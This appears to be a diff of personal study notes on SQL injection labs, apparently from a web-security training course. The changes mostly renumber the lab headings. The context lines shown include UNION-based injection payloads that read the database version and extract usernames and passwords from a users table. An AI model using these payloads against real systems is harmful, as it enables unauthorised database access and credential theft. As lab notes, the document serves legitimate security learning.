@@ -1,5 +1,6 @@
 # Examining the database in SQL injection attacks
 
+Examining database
 | Database type | Query |
 | ------------- | ------| 
 |Microsoft 		|	SELECT @@version |
@@ -7,7 +8,7 @@
 |PostgreSQL 	| 	SELECT version() |
 |MySQL 			|	SELECT @@version |
 
-## Lab - SQL injection attack, querying the database type and version on Oracle
+## Lab #1: SQL injection attack, querying the database type and version on Oracle
 
 Steps: 
 
@@ -52,10 +53,7 @@ category=Pets' UNION SELECT banner, null FROM v$version --
 
 `#` = %23
 
-## Listing the contents of the database
-
-
-## Lab: SQL injection attack, listing the database contents on non-Oracle databases
+## Lab #2: SQL injection attack, listing the database contents on non-Oracle databases
 
 Steps:
 
@@ -84,7 +82,7 @@ category=Pets' union select username_grhpij, password_rhddiy from users_rfankd -
 category=Pets' union select username_grhpij || ':' || password_rhddiy, null from users_rfankd -- 
 ```
 
-## Lab: SQL injection attack, listing the database contents on Oracle
+## Lab #3: SQL injection attack, listing the database contents on Oracle
 
 steps:
 1. Determine the number of columns and columns data type
